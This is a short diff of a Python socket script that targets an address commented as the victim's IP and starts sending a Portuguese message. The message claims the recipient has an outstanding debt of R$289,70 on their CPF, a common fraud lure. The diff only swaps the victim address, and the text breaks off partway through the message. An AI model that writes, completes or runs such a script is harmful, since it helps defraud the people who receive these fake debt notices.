@@ -1,6 +1,6 @@
 import socket
 
-HOST = '198.51.100.123'  # IP da vítima
+HOST = '198.51.100.129'  # IP da vítima
 PORT = 1234
 
 mensagem = ("Prezado(a) cliente, identificamos uma pendência financeira em seu CPF no valor de R$289,70.\n\n"
